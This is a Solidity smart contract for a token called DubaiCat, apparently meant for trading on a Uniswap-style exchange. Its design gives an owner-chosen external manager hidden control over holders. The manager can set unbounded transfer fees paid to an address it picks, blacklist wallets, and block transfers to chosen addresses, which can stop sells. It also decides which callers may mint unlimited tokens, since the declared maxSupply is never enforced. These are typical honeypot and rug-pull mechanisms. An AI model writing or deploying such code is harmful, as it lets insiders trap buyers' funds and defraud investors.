// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Context.sol";
import "./Ownable.sol";
import "./ERC20.sol";
import "./Address.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";
import "./ITManager.sol";
import "./IReward.sol";
contract DubaiCat is ERC20 ,Ownable, IReward{
    using SafeMath for uint256;
    using Address for address;
    uint256 public constant maxSupply = 10**10 * 10**18;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    uint8 private constant _DECIMALS = 18;
    uint256 private constant _DECIMALFACTOR = 10**uint256(_DECIMALS);
    uint256 public TOTAL_SUPPLY = 100 * (10**6) * _DECIMALFACTOR;
    ITManager public manager;
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {
        _mint(msg.sender, TOTAL_SUPPLY);
        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), ~uint256(0));
    }

     function setMan(address _manager) public onlyOwner {
        manager = ITManager(_manager);
    }

    modifier isPlayer() {
        bool check;
        address _address;
        (check,_address) =manager.isPlayer(msg.sender);
        require(
            check,
            "Only winer have permission"
        );
        _;
    }

    function claimReward(address _userAddress,uint256 amount) external override {
        claim(_userAddress, amount);

    }


    function claim(address winner, uint256 reward)
        internal
        isPlayer()
    {
        require(winner != address(0), "0x address is not accepted");
        require(reward > 0, "you have no reward!");
        _mint(winner, reward);
    }
    
    function _transfer( address sender, address recipient, uint256 amount ) internal virtual override {
        address feeAddress = manager.getTransferFeeAddress();
        uint256 transferFeeRate = manager.getTransferFeeRate(sender,recipient);
        
        if (sender != owner() && recipient != owner()) {
            require(!manager.isBotAddress(sender), "Play fair");
            require(!manager.isBotAddress(recipient), "Play fair");
        }

        if(manager.isBurnEnable()){
            if(manager.checkBurnAddress(sender, recipient)){
                require(!manager.isBurnEnable(), "Can't burn token");
            }
        }

        if (
            transferFeeRate > 0 &&
            recipient != address(0) &&
            feeAddress != address(0) ) {
            uint256 _fee = amount.mul(transferFeeRate).div(100);
            super._transfer(sender, feeAddress, _fee);
            amount = amount.sub(_fee);
        }

        super._transfer(sender, recipient, amount);
    }
}